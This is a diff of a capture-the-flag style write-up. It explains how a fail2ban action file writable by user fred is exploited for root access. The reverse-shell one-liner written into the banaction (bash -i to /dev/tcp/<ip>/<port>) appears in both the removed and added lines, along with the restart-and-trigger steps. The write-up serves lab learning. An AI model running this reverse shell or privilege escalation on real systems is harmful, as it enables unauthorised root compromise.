@@ -130,7 +130,9 @@ find / -user fred 2>/dev/null
 we find a file writable by fred, `/etc/fail2ban/action.d/iptables-multiport.conf`
 
 Using this blog regarding <a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/">fail2ban privesc</a>.
-After replacing the `banaction` with our reverse shell `bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1", we have to restart the service, which user fred can do by running `sudo /bin/systemctl restart fail2ban`
-all we have to do now is to trigger the ban action. After reading the config file `/etc/fail2ban/jail.local` we see that it is triggered after 3 retries.
+After replacing the `banaction` with our reverse shell `bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1",
+we have to restart the service, which user fred can do by running `sudo /bin/systemctl restart fail2ban`.
+all we have to do now is to trigger the ban action. 
+After reading the config file `/etc/fail2ban/jail.local` we see that it is triggered after 3 retries.
 
 Now what's left for us to do is to try to log in using ssh and establish 3 sessions in wich we enter a wrong pass, after that we get the shell as root.
